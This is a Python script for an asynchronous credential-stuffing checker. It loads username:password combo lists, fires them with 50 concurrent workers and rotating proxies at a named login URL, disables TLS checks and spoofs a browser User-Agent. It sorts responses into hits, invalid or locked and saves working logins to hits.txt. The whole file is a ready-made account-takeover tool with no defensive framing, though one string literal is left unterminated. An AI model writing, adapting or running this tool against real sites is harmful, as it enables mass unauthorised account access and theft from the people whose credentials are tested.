import asyncio
import aiohttp
import aiofiles
from typing import Optional
import time
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class CheckResult:
    username: str
    password: str
    status: str  # "hit" | "invalid" | "error" | "locked"
    response_time: float = 0.0
    detail: Optional[str] = None


@dataclass
class CheckerStats:
    hits: int = 0
    invalid: int = 0
    errors: int = 0
    locked: int = 0
    checked: int = 0
    start_time: float = field(default_factory=time.time)

    def elapsed(self) -> float:
        return round(time.time() - self.start_time, 2)

    def cpm(self) -> int:
        elapsed = self.elapsed()
        if elapsed == 0:
            return 0
        return int((self.checked / elapsed) * 60)


# ── Config ────────────────────────────────────────────────────────────────────

TARGET_URL    = "https://bclub.tk/login2/
COMBO_FILE    = "combos.txt"          # format: user:pass per line
HIT_FILE      = "hits.txt"
INVALID_FILE  = "invalid.txt"
THREADS       = 50                    # concurrent workers
TIMEOUT       = 10.0                  # seconds per request
RETRY_LIMIT   = 2
PROXY_FILE: Optional[str] = None      # "proxies.txt" or None


# ── Proxy loader ──────────────────────────────────────────────────────────────

async def load_proxies(path: Optional[str]) -> list[str]:
    if not path or not Path(path).exists():
        return []
    async with aiofiles.open(path, "r") as f:
        lines = await f.readlines()
    return [l.strip() for l in lines if l.strip()]


# ── Request layer ─────────────────────────────────────────────────────────────

def classify_response(status: int, body: str) -> tuple[str, Optional[str]]:
    """
    Adapt this to match the target's actual response contract.
    Check for success tokens, error strings, redirect patterns.
    """
    body_lower = body.lower()

    if status == 200 and any(tok in body_lower for tok in ["dashboard", "welcome", "logout", "token"]):
        return "hit", None
    if status in (401, 403):
        return "invalid", f"HTTP {status}"
    if status == 429:
        return "locked", "rate limited"
    if "invalid password" in body_lower or "incorrect" in body_lower:
        return "invalid", "bad credentials"
    if "locked" in body_lower or "suspended" in body_lower:
        return "locked", "account locked"

    return "error", f"unclassified HTTP {status}"


async def check_credential(
    session: aiohttp.ClientSession,
    username: str,
    password: str,
    proxy: Optional[str] = None,
) -> CheckResult:
    payload = {"username": username, "password": password}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
    }

    for attempt in range(RETRY_LIMIT + 1):
        t0 = time.perf_counter()
        try:
            async with session.post(
                TARGET_URL,
                json=payload,
                headers=headers,
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=TIMEOUT),
                ssl=False,
            ) as resp:
                body = await resp.text()
                elapsed = round(time.perf_counter() - t0, 3)
                status, detail = classify_response(resp.status, body)
                return CheckResult(username, password, status, elapsed, detail)

        except asyncio.TimeoutError:
            if attempt == RETRY_LIMIT:
                return CheckResult(username, password, "error", 0.0, "timeout")
        except aiohttp.ClientError as e:
            if attempt == RETRY_LIMIT:
                return CheckResult(username, password, "error", 0.0, str(e))
        await asyncio.sleep(0.5 * (attempt + 1))

    return CheckResult(username, password, "error", 0.0, "retry exhausted")


# ── Worker ────────────────────────────────────────────────────────────────────

async def worker(
    queue: asyncio.Queue,
    session: aiohttp.ClientSession,
    stats: CheckerStats,
    proxies: list[str],
    hit_writer,
    invalid_writer,
):
    proxy_count = len(proxies)
    proxy_index = 0

    while True:
        item = await queue.get()
        if item is None:
            queue.task_done()
            break

        username, password = item
        proxy = proxies[proxy_index % proxy_count] if proxies else None
        proxy_index += 1

        result = await check_credential(session, username, password, proxy)
        stats.checked += 1

        if result.status == "hit":
            stats.hits += 1
            line = f"{result.username}:{result.password}\n"
            await hit_writer.write(line)
            await hit_writer.flush()
            print(f"  [HIT]     {result.username}:{result.password}  ({result.response_time}s)")

        elif result.status == "invalid":
            stats.invalid += 1
            await invalid_writer.write(f"{result.username}:{result.password}\n")

        elif result.status == "locked":
            stats.locked += 1
            print(f"  [LOCKED]  {result.username}  — {result.detail}")

        else:
            stats.errors += 1

        if stats.checked % 100 == 0:
            print(
                f"  [STAT]  checked={stats.checked}  hits={stats.hits}  "
                f"errors={stats.errors}  locked={stats.locked}  "
                f"cpm={stats.cpm()}  elapsed={stats.elapsed()}s"
            )

        queue.task_done()


# ── Loader ────────────────────────────────────────────────────────────────────

async def load_combos(path: str) -> list[tuple[str, str]]:
    combos = []
    async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
        async for line in f:
            line = line.strip()
            if ":" not in line:
                continue
            user, _, pwd = line.partition(":")
            if user and pwd:
                combos.append((user, pwd))
    return combos


# ── Entry ─────────────────────────────────────────────────────────────────────

async def main():
    combos  = await load_combos(COMBO_FILE)
    proxies = await load_proxies(PROXY_FILE)

    print(f"[*] Loaded {len(combos):,} combos | {len(proxies)} proxies | {THREADS} threads")

    queue: asyncio.Queue = asyncio.Queue()
    stats = CheckerStats()

    for combo in combos:
        await queue.put(combo)
    for _ in range(THREADS):
        await queue.put(None)  # poison pills

    connector = aiohttp.TCPConnector(limit=THREADS, ssl=False)
    async with aiofiles.open(HIT_FILE, "a") as hit_f, \
               aiofiles.open(INVALID_FILE, "a") as inv_f, \
               aiohttp.ClientSession(connector=connector) as session:

        workers = [
            asyncio.create_task(
                worker(queue, session, stats, proxies, hit_f, inv_f)
            )
            for _ in range(THREADS)
        ]
        await queue.join()
        await asyncio.gather(*workers)

    print(
        f"\n[DONE]  hits={stats.hits}  invalid={stats.invalid}  "
        f"locked={stats.locked}  errors={stats.errors}  "
        f"total={stats.checked}  elapsed={stats.elapsed()}s"
    )


if __name__ == "__main__":
    asyncio.run(main())
